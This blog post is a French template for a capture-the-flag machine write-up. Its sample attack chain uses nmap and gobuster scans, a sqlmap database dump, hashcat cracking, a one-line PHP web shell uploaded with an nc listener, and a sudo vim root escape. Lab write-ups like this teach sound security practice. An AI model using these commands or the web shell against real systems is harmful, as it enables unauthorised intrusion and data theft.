---
layout: post
title: "Tester Post 🔧"
date: 2026-05-20 15:55:00
---

# [Nom de la Machine] — Write-up
**Plateforme:** HackTheBox / TryHackMe  
**Difficulté:** Easy / Medium / Hard  
**Catégorie:** Linux / Windows / Web  
**Date:** JJ/MM/AAAA  
**Auteur:** [Ton nom]

---

## 📋 Résumé

> Quelques phrases qui résument la machine pour quelqu'un qui n'a pas le temps de tout lire.
> Ex: *"Cette machine Windows exposait un service FTP anonyme permettant de récupérer des credentials. Ces derniers donnaient accès à un panneau d'administration web vulnérable à une injection SQL, menant à l'exécution de commandes et finalement à une élévation de privilèges via un service mal configuré."*

**Ce qu'on apprend dans ce write-up :**
- Technique 1 (ex: énumération FTP)
- Technique 2 (ex: injection SQL)
- Technique 3 (ex: privilege escalation via sudo)

---

## 🎯 Informations de la cible

| Champ | Valeur |
|---|---|
| IP | `10.10.10.XXX` |
| OS | Linux / Windows |
| Difficulté | Easy |
| Points | XXX |
| Auteur machine | NomAuteur |

---

## 🔍 Phase 1 — Reconnaissance

### Scan Nmap

On commence toujours par scanner les ports ouverts pour savoir ce qui tourne sur la machine.

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.XXX
```

**Résultat :**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9
80/tcp   open  http    Apache 2.4.38
443/tcp  open  https   Apache 2.4.38
```

**Ce qu'on remarque :** Un serveur web tourne sur le port 80 et 443. SSH est disponible mais on n'a pas encore de credentials. On va d'abord explorer le web.

---

### Exploration web

On visite `http://10.10.10.XXX` dans le navigateur.

> 📸 *[Screenshot de la page d'accueil]*

La page affiche un formulaire de login. On note aussi que le titre de la page mentionne "AdminPanel v2.1" — ce genre d'info peut être utile pour chercher des vulnérabilités connues.

On énumère les répertoires cachés avec Gobuster :

```bash
gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirb/common.txt
```

**Résultat :**
```
/admin        (Status: 200)
/backup       (Status: 403)
/uploads      (Status: 200)
```

On trouve un dossier `/backup` — même en 403, ça vaut la peine de creuser.

---

## 💥 Phase 2 — Exploitation

### Vulnérabilité trouvée : [Nom de la vulnérabilité]

**C'est quoi en simple :** [Explique la vulnérabilité comme si le lecteur ne connaît pas le domaine. Ex: "Une injection SQL, c'est quand un site web fait confiance à ce que l'utilisateur tape dans un formulaire et l'envoie directement à la base de données. On peut en profiter pour poser des questions à la base de données qu'on n'est pas censé pouvoir poser."]

**Pourquoi ça marche ici :** [Contexte spécifique à cette machine]

**Exploit :**

```bash
# Commande utilisée
sqlmap -u "http://10.10.10.XXX/login.php" --data="user=admin&pass=test" --dbs
```

**Résultat :**
```
[*] Database found: webapp_db
[*] Tables: users, sessions, products
```

On dump la table `users` :

```bash
sqlmap -u "http://10.10.10.XXX/login.php" --data="user=admin&pass=test" -D webapp_db -T users --dump
```

```
username | password
---------|------------------
admin    | 5f4dcc3b5aa765d61d8327deb882cf99  ← hash MD5
```

On craque le hash avec CrackStation ou hashcat :

```bash
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
```

**Mot de passe trouvé :** `password` (oui, vraiment 😅)

---

### Accès initial — Shell

Avec les credentials `admin:password` on se connecte au panneau d'admin. On y trouve une fonction d'upload de fichiers. On upload un reverse shell PHP :

```bash
# On prépare notre listener
nc -lvnp 4444
```

```php
# reverse_shell.php — shell basique
<?php system($_GET['cmd']); ?>
```

On accède à `http://10.10.10.XXX/uploads/reverse_shell.php?cmd=id` et on obtient :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On a un shell en tant que `www-data`. C'est un accès limité — on doit monter en privilèges.

---

## ⬆️ Phase 3 — Élévation de privilèges (PrivEsc)

**Objectif :** Passer de `www-data` à `root`

On commence par énumérer ce qu'on peut faire :

```bash
sudo -l
```

```
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
```

`www-data` peut lancer `vim` en tant que root sans mot de passe. C'est une misconfiguration classique.

**Exploit via GTFOBins :**  
GTFOBins est un site qui liste comment abuser de binaires légitimes pour escalader les privilèges. Pour vim :

```bash
sudo vim -c ':!/bin/bash'
```

Cette commande ouvre vim et exécute immédiatement `/bin/bash` avec les droits root.

```
root@machine:~# whoami
root
```

**On est root. 🎉**

---

## 🏁 Flags

```bash
# User flag
cat /home/username/user.txt
→ a1b2c3d4e5f6...

# Root flag  
cat /root/root.txt
→ z9y8x7w6v5u4...
```

---

## 📚 Ce qu'on a appris

| Technique | Pourquoi c'est important |
|---|---|
| Scan Nmap | Toujours la première étape — savoir ce qui est exposé |
| Énumération web (Gobuster) | Les répertoires cachés révèlent souvent des infos sensibles |
| Injection SQL | Vulnérabilité encore très répandue dans les apps mal codées |
| Reverse shell PHP | Technique classique pour passer de web à shell |
| Sudo misconfiguration | Une erreur de config peut donner root en 1 commande |

---

## 🛠️ Outils utilisés

- `nmap` — scan de ports
- `gobuster` — énumération de répertoires
- `sqlmap` — exploitation SQL automatisée
- `hashcat` — craquage de hash
- `netcat (nc)` — listener pour reverse shell
- [GTFOBins](https://gtfobins.github.io/) — référence pour PrivEsc

---

## 🔗 Références

- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

*Write-up rédigé par [Ton nom] — [ton blog/github]*